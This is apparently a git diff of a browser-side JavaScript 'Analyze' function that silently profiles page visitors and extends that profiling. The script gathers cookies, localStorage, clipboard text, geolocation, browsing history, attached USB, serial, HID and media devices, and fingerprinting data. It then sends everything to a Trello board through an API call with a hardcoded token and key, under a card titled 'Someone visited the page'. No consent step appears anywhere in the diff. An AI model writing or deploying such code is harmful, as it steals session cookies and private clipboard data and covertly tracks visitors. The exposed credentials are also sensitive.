@@ -10,6 +10,13 @@ function Analyze() {
 
     const listId = '62baaf7ce73a84408e99e2c0'
 
+    const PerformanceNavigationType = {
+        0: 'TYPE_NAVIGATE',
+        1: 'TYPE_RELOAD',
+        2: 'TYPE_BACK_FORWARD',
+        255: 'TYPE_RESERVED',
+    }
+
     var info = {
         timeOpened: 'Error',
         timezone: 'Error',
@@ -19,7 +26,6 @@ function Analyze() {
 
         pageon: 'Error',
         referrer: 'Error',
-        previousSites: 'Error',
 
         visitsIn10Days: 'Error',
 
@@ -30,12 +36,6 @@ function Analyze() {
         },
 
         sizes: {
-            screen: {
-                width: 'Error',
-                height: 'Error',
-                availWidth: 'Error',
-                availHeight: 'Error',
-            },
             document: {
                 width: 'Error',
                 height: 'Error',
@@ -46,18 +46,18 @@ function Analyze() {
             },
         },
 
-        screen: {
-            colorDepth: 'Error',
-            pixelDepth: 'Error',
+        connection: {
+            downlink: 'Error',
+            downlinkMax: 'Error',
+            effectiveType: 'Error',
+            rtt: 'Error',
+            saveData: 'Error',
+            type: 'Error',
         },
 
         navigator: {
-            connection: 'Error',
             doNotTrack: 'Error',
-            hardwareConcurrency: 'Error',
             languages: 'Error',
-            maxTouchPoints: 'Error',
-            gamepads: 'Error',
             mediaSession: 'Error',
             webdriver: 'Error',
             baseURI: 'Error',
@@ -65,7 +65,61 @@ function Analyze() {
             domain: 'Error',
             javaEnabled: 'Error',
             dataCookiesEnabled: 'Error',
+            history: {
+                length: 'Error',
+                state: 'Error',
+                scrollRestoration: 'Error',
+            },
+            perfomance: {
+                memory: {
+                    jsHeapSizeLimit: 'Error',
+                    totalJSHeapSize: 'Error',
+                    usedJSHeapSize: 'Error',
+                },
+                navigation: {
+                    redirectCount: 'Error',
+                    type: 'Error',
+                },
+            },
+            visualViewport: {
+                width: 'Error',
+                height: 'Error',
+                offsetLeft: 'Error',
+                offsetTop: 'Error',
+                pageLeft: 'Error',
+                pageTop: 'Error',
+                scale: 'Error',
+            },
+            clipboard: 'Error',
+            personalbarVisible: 'Error',
+            statusbarVisible: 'Error',
+            scrollbarsVisible: 'Error',
+            toolbarVisible: 'Error',
+            styleMediaType: 'Error',
+        },
+
+        hardware: {
+            hardwareConcurrency: 'Error',
+            maxTouchPoints: 'Error',
+            gamepads: 'Error',
             geolocation: 'Error',
+
+            screen: {
+                colorDepth: 'Error',
+                pixelDepth: 'Error',
+                width: 'Error',
+                height: 'Error',
+                availWidth: 'Error',
+                availHeight: 'Error',
+                orientation: {
+                    angle: 'Error',
+                    type: 'Error',
+                },
+                isExtended: 'Error',
+                availLeft: 'Error',
+                availTop: 'Error',
+            },
+            bluetoothAvailability: 'Error',
         },
 
         browser: {
@@ -94,14 +148,47 @@ function Analyze() {
 
     try {
         var xmlHttp = new XMLHttpRequest()
-        xmlHttp.open("GET", 'https://api.ipify.org/', false)
+        xmlHttp.open("GET", 'https://api.ipify.org/', true)
         xmlHttp.send(null)
-        info.ipAddress = xmlHttp.responseText
+        xmlHttp.onerror = function() {
+            info.ipAddress = 'The fetch failed'
+        }
+        xmlHttp.onabort = function() {
+            info.ipAddress = 'The fetch aborted'
+        }
+        xmlHttp.onreadystatechange = function() {
+            if (xmlHttp.responseText.length > 0) {
+                info.ipAddress = xmlHttp.responseText
+            }
+        }
+        info.ipAddress = 'Timed out'
     } catch (ex) { }
 
-    try { info.browser.name1 = GetBrowser() } catch (ex) { }
     try { info.os = getOS() } catch (ex) { }
 
+    try { info.timeOpened = new Date() } catch (ex) { }
+    try { info.timeOpened = new Date().toString() } catch (ex) { }
+    try { info.timezone = (new Date()).getTimezoneOffset() } catch (ex) { }
+    try { info.timezone = (new Date()).getTimezoneOffset() / 60 } catch (ex) { }
+
+    try { info.navigator.dataCookiesEnabled = navigator.cookieEnabled } catch (ex) { }
+    try { info.data.dataCookies1 = document.cookie } catch (ex) { }
+    try { info.data.dataCookies2 = document.cookie.split(";") } catch (ex) { }
+    try { info.data.dataCookies2 = decodeURIComponent(document.cookie.split(";")) } catch (ex) { }
+    try { info.data.dataStorage = localStorage } catch (ex) { }
+
+    try { info.referrer = document.referrer } catch (ex) { }
+    try { info.pageon = window.location.pathname } catch (ex) { }
+
+    try { info.sizes.document.width = document.width } catch (ex) { }
+    try { info.sizes.document.height = document.height } catch (ex) { }
+    try { info.sizes.inner.width = innerWidth } catch (ex) { }
+    try { info.sizes.inner.height = innerHeight } catch (ex) { }
+
+    try { info.browser.vendor = navigator.vendor } catch (ex) { }
+    try { info.browser.codeName = navigator.appCodeName } catch (ex) { }
+    try { info.browser.productSub = navigator.productSub } catch (ex) { }
+    try { info.browser.vendorSub = navigator.vendorSub } catch (ex) { }
     try { info.browser.name2 = navigator.appName } catch (ex) { }
     try { info.browser.engine = navigator.product } catch (ex) { }
     try { info.browser.version1 = navigator.appVersion } catch (ex) { }
@@ -109,59 +196,91 @@ function Analyze() {
     try { info.browser.language = navigator.language } catch (ex) { }
     try { info.browser.online = navigator.onLine } catch (ex) { }
     try { info.browser.platform = navigator.platform } catch (ex) { }
+    try { info.browser.name1 = GetBrowser() } catch (ex) { }
+    
+    try { info.connection.downlink = navigator.connection.downlink } catch (ex) { }
+    try { info.connection.downlinkMax = navigator.connection.downlinkMax } catch (ex) { }
+    try { info.connection.effectiveType = navigator.connection.effectiveType } catch (ex) { }
+    try { info.connection.rtt = navigator.connection.rtt } catch (ex) { }
+    try { info.connection.saveData = navigator.connection.saveData } catch (ex) { }
+    try { info.connection.type = navigator.connection.type } catch (ex) { }
+
     try { info.navigator.javaEnabled = navigator.javaEnabled() } catch (ex) { }
-    try { info.navigator.dataCookiesEnabled = navigator.cookieEnabled } catch (ex) { }
-
-    try { info.timeOpened = new Date() } catch (ex) { }
-    try { info.timeOpened = new Date().toString() } catch (ex) { }
-    try { info.timezone = (new Date()).getTimezoneOffset() } catch (ex) { }
-    try { info.timezone = (new Date()).getTimezoneOffset() / 60 } catch (ex) { }
-
-    try { info.data.dataCookies1 = document.cookie } catch (ex) { }
-    try { info.data.dataCookies2 = document.cookie.split(";") } catch (ex) { }
-    try { info.data.dataCookies2 = decodeURIComponent(document.cookie.split(";")) } catch (ex) { }
-    try { info.data.dataStorage = localStorage } catch (ex) { }
-
-    try { info.previousSites = history.length } catch (ex) { }
-    try { info.referrer = document.referrer } catch (ex) { }
-    try { info.pageon = window.location.pathname } catch (ex) { }
-
-    try { info.sizes.screen.width = screen.width } catch (ex) { }
-    try { info.sizes.screen.height = screen.height } catch (ex) { }
-    try { info.sizes.screen.availWidth = screen.availWidth } catch (ex) { }
-    try { info.sizes.screen.availHeight = screen.availHeight } catch (ex) { }
-
-    try { info.sizes.document.width = document.width } catch (ex) { }
-    try { info.sizes.document.height = document.height } catch (ex) { }
-    try { info.sizes.inner.width = innerWidth } catch (ex) { }
-    try { info.sizes.inner.height = innerHeight } catch (ex) { }
-    try { info.screen.colorDepth = screen.colorDepth } catch (ex) { }
-    try { info.screen.pixelDepth = screen.pixelDepth } catch (ex) { }
-
-    try { info.navigator.connection = navigator.connection.type } catch (ex) { }
     try { info.navigator.doNotTrack = navigator.doNotTrack } catch (ex) { }
-    try { info.navigator.hardwareConcurrency = navigator.hardwareConcurrency } catch (ex) { }
     try { info.navigator.languages = navigator.languages } catch (ex) { }
-    try { info.navigator.maxTouchPoints = navigator.maxTouchPoints } catch (ex) { }
-    try { info.navigator.gamepads = navigator.getGamepads() } catch (ex) { }
     try { info.navigator.mediaSession = navigator.mediaSession } catch (ex) { }
-    try { info.navigator.onLine = navigator.onLine } catch (ex) { }
-    try { info.browser.vendor = navigator.vendor } catch (ex) { }
     try { info.navigator.webdriver = navigator.webdriver } catch (ex) { }
-    try { info.browser.codeName = navigator.appCodeName } catch (ex) { }
-    try { info.browser.productSub = navigator.productSub } catch (ex) { }
-    try { info.browser.vendorSub = navigator.vendorSub } catch (ex) { }
-    try { info.navigator.baseURI = navigator.baseURI } catch (ex) { }
     try { info.navigator.URL = navigator.URL } catch (ex) { }
     try { info.navigator.domain = navigator.domain } catch (ex) { }
+    try { info.navigator.baseURI = navigator.baseURI } catch (ex) { }
+    try { navigator.clipboard.readText().then((clipboardItems) => {
+        info.navigator.clipboard = clipboardItems
+    }).catch((err) => { }) } catch (ex) { }
+    try { info.navigator.history.length = history.length } catch (ex) { }
+    try { info.navigator.history.state = history.state } catch (ex) { }
+    try { info.navigator.history.scrollRestoration = history.scrollRestoration } catch (ex) { }
+    
+    try { info.navigator.perfomance.memory.jsHeapSizeLimit = performance.memory.jsHeapSizeLimit } catch (ex) { }
+    try { info.navigator.perfomance.memory.totalJSHeapSize = performance.memory.totalJSHeapSize } catch (ex) { }
+    try { info.navigator.perfomance.memory.usedJSHeapSize = performance.memory.usedJSHeapSize } catch (ex) { }
+    try { info.navigator.perfomance.navigation.redirectCount = performance.navigation.redirectCount } catch (ex) { }
+    try { info.navigator.perfomance.navigation.type = performance.navigation.type + ' (' + PerformanceNavigationType[performance.navigation.type] + ')' } catch (ex) { }
 
+    try { info.navigator.personalbarVisible = personalbar.visible } catch (ex) { }
+    try { info.navigator.statusbarVisible = statusbar.visible } catch (ex) { }
+    try { info.navigator.scrollbarsVisible = scrollbars.visible } catch (ex) { }
+    try { info.navigator.toolbarVisible = toolbar.visible } catch (ex) { }
+
+    try { info.navigator.visualViewport.width = visualViewport.width } catch (ex) { }
+    try { info.navigator.visualViewport.height = visualViewport.height } catch (ex) { }
+    try { info.navigator.visualViewport.offsetLeft = visualViewport.offsetLeft } catch (ex) { }
+    try { info.navigator.visualViewport.offsetTop = visualViewport.offsetTop } catch (ex) { }
+    try { info.navigator.visualViewport.pageLeft = visualViewport.pageLeft } catch (ex) { }
+    try { info.navigator.visualViewport.pageTop = visualViewport.pageTop } catch (ex) { }
+    try { info.navigator.visualViewport.scale = visualViewport.scale } catch (ex) { }
+
+    try { info.navigator.styleMediaType = styleMedia.type } catch (ex) { }
+
+    try { info.hardware.screen.colorDepth = screen.colorDepth } catch (ex) { }
+    try { info.hardware.screen.pixelDepth = screen.pixelDepth } catch (ex) { }
+    try { info.hardware.screen.isExtended = screen.isExtended } catch (ex) { }
+
+    try { info.hardware.screen.orientation.angle = screen.orientation.angle } catch (ex) { }
+    try { info.hardware.screen.orientation.type = screen.orientation.type } catch (ex) { }
+
+    try { info.hardware.screen.width = screen.width } catch (ex) { }    
+    try { info.hardware.screen.height = screen.height } catch (ex) { }
+
+    try { info.hardware.screen.availWidth = screen.availWidth } catch (ex) { }
+    try { info.hardware.screen.availHeight = screen.availHeight } catch (ex) { }
+
+    try { info.hardware.screen.availLeft = screen.availLeft } catch (ex) { }
+    try { info.hardware.screen.availTop = screen.availTop } catch (ex) { }
+
+    try { navigator.serial.getPorts().then((res) => { info.hardware.serialPorts = res }).catch((err) => { }) } catch (ex) { }
+    try { navigator.bluetooth.getAvailability().then((res) => { info.hardware.bluetoothAvailability = res }).catch((err) => { }) } catch (ex) { }
+    try { navigator.usb.getDevices().then((res) => { info.hardware.usbDevices = res }).catch((err) => { }) } catch (ex) { }
+    try { navigator.mediaDevices.enumerateDevices().then((res) => { info.hardware.mediaDevices = res }).catch((err) => { }) } catch (ex) { }
+    try { info.hardware.hardwareConcurrency = navigator.hardwareConcurrency } catch (ex) { }
+    try { info.hardware.maxTouchPoints = navigator.maxTouchPoints } catch (ex) { }
+    try { info.hardware.gamepads = navigator.getGamepads() } catch (ex) { }
+    try { navigator.hid.getDevices().then((res) => { info.hardware.hid = res }).catch((err) => { }) } catch (ex) { }
     try {
         navigator.geolocation.getCurrentPosition((pos) => {
-            info.navigator.geolocation = pos.coords
+            info.hardware.geolocation = pos.coords
         }, (err) => {
-            info.navigator.geolocation = err.message
+            info.hardware.geolocation = err.message
         })
     } catch (ex) { }
+
+    info.userAgentData = navigator.userAgentData
+    navigator.userAgentData
+        .getHighEntropyValues(['architecture', 'bitness', 'brands', 'mobile', 'model', 'platform', 'platformVersion', 'uaFullVersion', 'fullVersionList', 'wow64'])
+        .then(ua => {
+            info.userAgentData = ua
+        })
+        .catch((err) => { })
+    
 
     setTimeout(() => {
         var data = JSON.stringify(info, null, '\t')
@@ -172,7 +291,7 @@ function Analyze() {
             '&token=84de6f5cbc9e3fb5df77596358352cc839e1dea58d8dbb0857919f39b6143acf' +
             '&key=16160910964e82904e57646c84c9fb69' +
             '&name=' + urlParameter('Valaki meglátogatta az oldalt') +
-            '&desc=' + '`' + urlParameter(data) + '`' +
+            '&desc=' + '```' + urlParameter(data) + '```' +
             '&idLabels=' + labelId +
             '&pos=top'
             , true)
